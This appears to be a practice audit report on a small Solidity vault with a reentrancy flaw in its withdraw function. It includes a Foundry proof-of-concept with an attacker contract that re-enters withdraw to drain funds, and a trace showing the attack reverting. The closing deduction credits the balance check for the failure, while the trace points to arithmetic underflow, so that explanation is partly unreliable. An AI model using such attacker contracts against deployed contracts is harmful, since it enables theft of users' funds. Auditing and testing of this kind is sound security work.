# 🛡️ Smart Contract Security Report – [SimpleVault](https://github.com/Ayoubioussoufa/-Smart-Contract-Auditing-Practice/blob/MAIN/SimpleVault.sol)

## 🔧 Tools Used
- 🔍 **Slither** – Static analysis and vulnerability detection  
- 🐦 **Aderyn** – Cross-verification of known smart contract issues  
- 🔨 **Foundry** – Testing, fuzzing, and custom Proof-of-Concepts (PoCs)

# Summary

## Files Summary

| Key | Value   |
| --- | ---     |
| .sol Files | 1 |
| Total nSLOC | 21 |


## Files Details

| Filepath | nSLOC |
| --- | --- |
| src/SimpleVault.sol | 21 |
| **Total** | **21** |

In `SimpleVault::withdraw`, there is a reentrancy due to not respecting the CEI (Checks-Effects-Interactions): 
```javascript
function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Not enough balance");
->        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Withdraw failed");
->        balances[msg.sender] -= amount;
    }
```
So can we really steal the funds of other users ?
after a quick test : 
```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {SimpleVault} from "../src/SimpleVault.sol";

contract FirstTest is Test {
    SimpleVault public vault;
    Malicious public malicious;
    address public alice = makeAddr("Alice");
    address public bob = makeAddr("Bob");

    function setUp() public {
        vault = new SimpleVault();
        malicious = new Malicious(vault);
        vm.deal(address(malicious), 100 ether);
        vm.deal(alice, 100 ether);
        vm.deal(bob, 100 ether);
    }

    function test_deposit() public {
        vm.prank(alice);
        vault.deposit{value: 100 ether}();
        vm.prank(bob);
        vault.deposit{value: 90 ether}();
    }

    function test_withdraw() public {
        vm.prank(alice);
        vault.deposit{value: 10 ether}();
        vm.prank(alice);
        vault.withdraw(10 ether);
        assertEq(alice.balance, 100 ether);
    }

    function testMalicious() public {
    vm.prank(alice);
    vault.deposit{value: 60 ether}();
    vm.prank(bob);
    vault.deposit{value: 60 ether}();
    vm.prank(address(malicious));
    vault.deposit{value: 5 ether}();
    console.log("Vault balance Before attack:", address(vault).balance);
    malicious.hack();
    console.log("Malicious balance:", address(malicious).balance);
    console.log("Vault balance After attack:", address(vault).balance);
}

}

contract Malicious {
    SimpleVault public vault;
    uint public counter;

    constructor(SimpleVault _vault) {
        vault = _vault;
    }

    function hack() public {
        vault.withdraw(4 ether);
    }

    fallback() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw(1 ether);
        }
    }

}
```

we found out that not every reentrancy means we can steal them. WHY ?
when the reentrancy recurse back, we get this :
```
└─ ← [Revert] panic: arithmetic underflow or overflow (0x11)
 └─ ← [Revert] revert: Withdraw failed
 ```


## Deduction:
Although the contract is vulnerable to reentrancy due to updating the user's balance after the external call, the attack fails to steal more than the attacker deposited. This is because the contract checks `SimpleVault::balances[msg.sender]` before each withdrawal. Once the attacker's internal balance is depleted, further recursive calls revert. Therefore, the reentrancy occurs but is not exploitable beyond the attacker's own balance.